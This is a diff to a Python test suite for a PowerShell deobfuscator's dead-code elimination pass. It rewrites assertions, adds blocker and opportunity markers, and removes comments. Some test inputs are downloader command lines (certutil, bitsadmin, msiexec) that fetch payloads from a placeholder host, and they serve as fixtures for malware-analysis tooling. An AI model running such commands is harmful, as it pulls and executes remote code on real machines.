@@ -2,6 +2,7 @@ from __future__ import annotations
 
 from inspect import cleandoc
 
+from test import blocker, opportunity
 from test.lib.scripts.ps1.deobfuscation import TestPs1
 
 from refinery.lib.scripts.pipeline import PipelineObserver, TransformerGroup
@@ -29,13 +30,13 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertNotIn("'a'", result)
         self.assertIn('b', result)
 
-    def test_if_false_then_true_elseif(self):
+    def test_if_false_then_true_elseif_keeps_only_the_elseif_body(self):
         result = self._deobfuscate("if ($False) {} elseif ($True) { Write-Host 'second' }")
-        self.assertIn('second', result)
+        self.assertEqual(result, "Write-Host 'second'")
 
     def test_all_false_keeps_else(self):
         result = self._deobfuscate("if ($False) {} elseif ($False) {} else { Write-Host 'else' }")
-        self.assertIn('else', result)
+        self.assertEqual(result, "Write-Host 'else'")
 
     def test_non_static_stops_pruning(self):
         result = self._deobfuscate("$x = $env:V\nif ($False) {} elseif ($x) { Write-Host 'kept' }")
@@ -48,6 +49,11 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertIn('b', result)
         self.assertNotIn("'a'", result)
         self.assertNotIn("'c'", result)
+
+    @blocker
+    def test_the_clause_a_switch_over_a_constant_runs_keeps_the_value_it_runs_for(self):
+        source = "switch ('abc') { 'abc' { Write-Host $_ } }"
+        self._assertDeobfuscatesToOneOf(source, source, "Write-Host 'abc'")
 
     def test_switch_constant_default(self):
         result = self._deobfuscate("switch (99) { 1 { 'a' } default { 'd' } }")
@@ -122,10 +128,10 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertNotIn('for', result.lower())
         self.assertNotIn('Write-Host', result)
 
-    def test_dead_for_loop_true_condition(self):
+    def test_a_for_loop_whose_condition_holds_at_entry_still_prints(self):
         result = self._deobfuscate(
             "for($x=10;$x-Eq10;$x++){Write-Host 'hi'}")
-        self.assertIn('for', result.lower())
+        self.assertIn("Write-Host 'hi'", result)
 
     def test_dead_for_loop_no_initializer(self):
         result = self._deobfuscate(
@@ -144,11 +150,6 @@ class TestPs1DeadCodeElimination(TestPs1):
     def test_for_break_labeled_preserved(self):
         result = self._deobfuscate(
             ":outer for($i=0;$i -lt 5;$i++){$x = 1; break :outer}")
-        self.assertIn('for', result.lower())
-
-    def test_for_break_with_continue_preserved(self):
-        result = self._deobfuscate(
-            "for($i=0;$i -lt 5;$i++){if($i -eq 3){continue}; $x = 1; break}")
         self.assertIn('for', result.lower())
 
     def test_for_break_unreachable_tail_removed(self):
@@ -209,12 +210,9 @@ class TestPs1DeadCodeElimination(TestPs1):
             '$c = $b - 200\n'
             '$d = [Char][int]$c'
         )
-        self.assertNotIn('[Char]-', result.lower())
+        self.assertNotIn('190', result)
 
     def test_bare_integer_statements_are_not_this_passs_to_drop(self):
-        # `42` prints `42` on PowerShell 5.1 and `(-7)` prints `-7`. Deleting a write to the output
-        # stream is a decision `Ps1JunkStatementRemoval` owns alone, so this runs in isolation:
-        # through the whole pipeline the assertion would hold or fail on the other pass's answer.
         result = self._apply(
             '$x = Get-Process\n'
             '42\n'
@@ -240,8 +238,6 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertIn('hello', result)
 
     def test_a_constant_in_a_switch_case_is_not_this_passs_to_drop(self):
-        # A switch clause body writes through to whoever reads the switch: `switch (1) { 1 { 7 } }`
-        # prints `7`.
         result = self._apply(
             'switch ($action) {\n'
             '  1 { 99 }\n'
@@ -252,11 +248,9 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertIn('99', result)
         self.assertIn('Write-Host', result)
 
-    def test_constant_in_subexpression_preserved(self):
-        result = self._deobfuscate('"prefix$( 1 + 2 )suffix"')
-        self.assertIn('prefix', result)
-        self.assertIn('suffix', result)
-        self.assertNotIn('prefix""suffix', result.replace(' ', ''))
+    def test_a_constant_in_a_subexpression_is_kept_or_expanded_into_the_string(self):
+        source = '"prefix$( 1 + 2 )suffix"'
+        self._assertDeobfuscatesToOneOf(source, source, "'prefix3suffix'")
 
     def test_scriptblock_body_constant_preserved(self):
         result = self._deobfuscate('$x = & { $True }')
@@ -270,8 +264,6 @@ class TestPs1DeadCodeElimination(TestPs1):
 class TestPs1DeadCodeExtra(TestPs1):
 
     def test_value_producing_if_assignment_keeps_branches(self):
-        # The branch outputs of an assignment-RHS `if` are observable, so dead-code and junk
-        # removal must leave the `if` untouched.
         result = self._apply(
             "$x = if ($c) { 'aaa' } else { 'bbb' }",
             Ps1DeadCodeElimination, Ps1JunkStatementRemoval)
@@ -327,13 +319,15 @@ class TestPs1DeadCodeExtra(TestPs1):
         result = self._apply('trap [Exception] { continue }', Ps1DeadCodeElimination)
         self.assertEqual(result, '')
 
-    def test_trap_with_output_kept(self):
+    @opportunity
+    def test_a_trap_with_output_that_guards_nothing_is_removed(self):
         result = self._apply("trap { Write-Host 'log' }", Ps1DeadCodeElimination)
-        self.assertEqual(result, "trap {\n  Write-Host 'log'\n}")
+        self.assertEqual(result, '')
 
-    def test_trap_labeled_break_kept(self):
+    @opportunity
+    def test_a_trap_with_a_labeled_break_that_guards_nothing_is_removed(self):
         result = self._apply('trap { break :outer }', Ps1DeadCodeElimination)
-        self.assertEqual(result, 'trap {\n  break :outer\n}')
+        self.assertEqual(result, '')
 
     def test_empty_for_counter_terminal(self):
         result = self._apply(
@@ -351,9 +345,6 @@ class TestPs1DeadCodeExtra(TestPs1):
         self.assertEqual(result, '$i = 5')
 
     def test_a_hoisted_for_initializer_does_not_start_printing_its_value(self):
-        # A `for` initializer's value reaches nobody — `for ((Get-Date); $False; ) { }` prints
-        # nothing — so carrying one out of the dissolved loop as a bare statement would make the
-        # script write to the output stream where it did not. It is hoisted as a discard instead.
         result = self._apply("for (5; $False; ) { }\nWrite-Host 'go'", Ps1DeadCodeElimination)
         self.assertEqual(result, "$Null = 5\nWrite-Host 'go'")
 
@@ -392,9 +383,7 @@ class TestPs1DeadCodeExtra(TestPs1):
         self.assertEqual(result, "Write-Host 'f'")
 
     def test_a_try_body_that_may_raise_keeps_its_construct(self):
-        # Dissolving moves these out of the `try`, where the empty `catch` was swallowing what they
-        # raise; side-effect-freedom alone does not establish that a body cannot raise.
-        for body in ('[Math]::Sqrt(9)', '[Int]$d', '1 / $d', '$a[$i]'):
+        for body in ('[Math]::Sqrt($d)', '[Int]$d', '1 / $d', '$a[$i]'):
             with self.subTest(body):
                 self._assertUnchanged(cleandoc(
                     F"""
@@ -406,7 +395,6 @@ class TestPs1DeadCodeExtra(TestPs1):
                 ), Ps1DeadCodeElimination)
 
     def test_a_noise_bareword_below_an_open_world_is_kept(self):
-        # A bareword is dropped on a guess that nothing defines it, and `iex` can have defined it.
         self._assertUnchanged(cleandoc(
             """
             iex $x
@@ -440,8 +428,6 @@ class TestPs1DeadCodeExtra(TestPs1):
         self.assertIn('Remove-Item', result)
 
     def test_try_wrapped_native_binary_kept(self):
-        # None of these is a cmdlet, but a `try`/`catch` around one is how a downloader hides its
-        # own failure, not a sign of junk.
         for command in (
             "certutil -urlcache -split -f 'http://host/payload.exe'",
             "bitsadmin /transfer j 'http://host/p.exe' C:\\p.exe",
@@ -508,8 +494,29 @@ class TestPs1DeadCodeExtra(TestPs1):
             }
             """
         )
-        result = self._apply(code, Ps1DeadCodeElimination)
-        self.assertEqual(result, code)
+        self.assertIn(self._apply(code, Ps1DeadCodeElimination), (code, cleandoc(
+            """
+            while ($outer) {
+              $x = 1
+              $z = 2
+            }
+            """
+        )))
+
+    @opportunity
+    def test_do_while_false_continue_ends_the_do_like_a_break(self):
+        result = self._apply(
+            'while ($outer) { do { $x = 1; continue } while ($False); $z = 2 }',
+            Ps1DeadCodeElimination,
+        )
+        self.assertEqual(result, cleandoc(
+            """
+            while ($outer) {
+              $x = 1
+              $z = 2
+            }
+            """
+        ))
 
     def test_trap_with_inert_body_removed(self):
         result = self._apply(
@@ -541,13 +548,6 @@ class TestPs1DeadCodeExtra(TestPs1):
 
 
 class TestPs1ASwitchIsKeptWhileAJumpInItsClauseLandsOnIt(TestPs1):
-    """
-    A `switch` is a loop to the jumps inside it: a `break` or `continue` that nothing nested in the
-    clause takes ends the `switch` or moves it to its next value, and a label sends one to the loop
-    it names. Each `switch` below runs over one value, so a jump that lands on it skips the rest of
-    the clause and the `foreach` goes on to write `x`. Resolving the `switch` into its clause hands
-    the jump to the `foreach`, which then skips `x` or stops.
-    """
 
     def test_a_continue_nested_in_the_clause_keeps_the_switch(self):
         result = self._apply(cleandoc("""
@@ -625,10 +625,6 @@ class TestPs1ASwitchIsKeptWhileAJumpInItsClauseLandsOnIt(TestPs1):
         self.assertIn('switch', result)
 
     def test_a_trailing_break_naming_the_loop_around_the_switch_keeps_it(self):
-        """
-        The `break` leaves the `foreach` after its first value, so the input writes `1` alone.
-        Taking it for the `break` that ends the `switch` drops it and writes `x` after every value.
-        """
         result = self._apply(cleandoc("""
             :outer foreach ($i in 1..3) {
               switch (1) {
@@ -725,11 +721,6 @@ class TestPs1UnreachableStatementRemoval(TestPs1):
         ))
 
     def test_a_statement_after_a_throw_is_kept_where_errors_silently_continue(self):
-        """
-        Where the error preference silently continues and no `trap` is in force, 5.1 carries on
-        past a `throw` outside any `try` exactly as past any other error, so `after` is written.
-        The control-flow graph reads every `throw` as ending its block.
-        """
         self._assertUnchanged(cleandoc(
             """
             $ErrorActionPreference = 'SilentlyContinue'
@@ -854,11 +845,6 @@ class TestPs1UnreachableStatementRemoval(TestPs1):
 
 
 class TestPs1ALoopWhoseBodyCannotRunTwiceRunsItOnce(TestPs1):
-    """
-    A loop whose body cannot start a second run is one run of that body, whether the body ends in
-    a `break` or in a statement that never completes. The statements that never run go in the same
-    visit, a `break` behind a `return` among them, so a loop that waited for its `break` stayed.
-    """
 
     def test_a_loop_whose_break_stands_behind_a_return_runs_its_body_once(self):
         result = self._apply(cleandoc(
@@ -1005,10 +991,6 @@ class TestPs1ALoopWhoseBodyCannotRunTwiceRunsItOnce(TestPs1):
 
 
 class TestPs1ADeadCodeVisitLeavesNothingForTheNext(TestPs1):
-    """
-    The pass prunes until nothing it can do is left, so a pipeline does not run it again on the
-    tree it just left.
-    """
 
     _SCRIPTS = (
         "while ($True) { if ($False) { continue }; return; break }\nWrite-Host 'end'",
@@ -1043,12 +1025,6 @@ class TestPs1ADeadCodeVisitLeavesNothingForTheNext(TestPs1):
 
 
 class TestPs1ATryWhoseBodyCannotRaiseDissolvesWhateverItsHandlerTakes(TestPs1):
-    """
-    A handler that matches is a precondition on *dropping* a statement that raises, not on
-    dissolving a construct. A body that cannot raise reaches the statements below it whether a
-    clause matches it, misses it, or is absent altogether, so the construct around it means nothing
-    and goes.
-    """
 
     def test_a_constant_body_under_a_catch_that_cannot_match_dissolves(self):
         self.assertEqual(
@@ -1067,10 +1043,6 @@ class TestPs1ATryWhoseBodyCannotRaiseDissolvesWhateverItsHandlerTakes(TestPs1):
 
 
 class TestPs1InjectedNoiseBareword(TestPs1):
-    """
-    An artifact is a mis-lexed two-token assignment and nothing else, so a real invocation carrying
-    operands has to survive the guess even when an argument starts with `=`.
-    """
 
     def test_an_assignment_residue_is_dropped(self):
         for source in ('0042DsKaho=8602057', 'Zbc =1', 'aQ=2'):
@@ -1095,13 +1067,8 @@ class TestPs1InjectedNoiseBareword(TestPs1):
 
 
 class TestPs1NoiseBarewordSpellings(TestPs1):
-    """
-    An artifact is what the lexer leaves on meeting two tokens where a command was expected, so
-    every spelling only a hand-written command line can produce has to survive the guess.
-    """
 
     def test_a_quoted_argument_is_not_assignment_residue(self):
-        # An assignment cannot produce a quoted token.
         for source in (
             "certutil '=http://host/payload.exe'",
             'certutil "=http://host/payload.exe"',
@@ -1113,19 +1080,10 @@ class TestPs1NoiseBarewordSpellings(TestPs1):
                 self.assertIn('try', result)
 
     def test_a_call_operator_is_not_assignment_residue(self):
-        # `&` is legal only in command position, so an assignment can never carry one.
         result = self._apply(
             "try { & msiexec =http://host/p.msi } catch { }\nWrite-Host 'keep'",
             Ps1DeadCodeElimination)
         self.assertIn('try', result)
-
-    def test_the_unquoted_two_token_residue_is_still_dropped(self):
-        for source in ('0042DsKaho=8602057', 'Zbc =1', 'aQ=2'):
-            with self.subTest(source):
-                result = self._apply(
-                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
-                    Ps1DeadCodeElimination)
-                self.assertEqual(result, "Write-Host 'keep'")
 
 
 class TestPs1DeadCodeLeavesTheTreeConsistent(TestPs1):
@@ -1211,9 +1169,6 @@ class TestPs1DeadCodeLeavesTheTreeConsistent(TestPs1):
         self._assertTreeIsIntact(source, source, Ps1DeadCodeElimination)
 
     def test_a_branch_that_never_runs_takes_its_redirection_with_it(self):
-        # A removal claims the code does not run at all, so what the dead branch would have written
-        # is not work being lost. Only a rewrite that keeps the value owes the redirection, and
-        # applying that rule here would leave every constant condition standing.
         result = self._apply(
             "if ($false) { Write-Host 'dead' > C:\\o.txt } else { Write-Host 'live' }",
             Ps1DeadCodeElimination)
@@ -1221,11 +1176,6 @@ class TestPs1DeadCodeLeavesTheTreeConsistent(TestPs1):
 
 
 class TestPs1TypeDefinitionsSurviveNeverRunCode(TestPs1):
-    """
-    PowerShell registers a top-level `class` or `enum` when it compiles the script, before the
-    first statement runs, so a definition inside a region that never executes still defines its
-    type and has to survive the removal of that region.
-    """
 
     def test_a_class_in_a_constant_false_branch_survives_while_its_plain_twin_is_removed(self):
         kept = cleandoc(
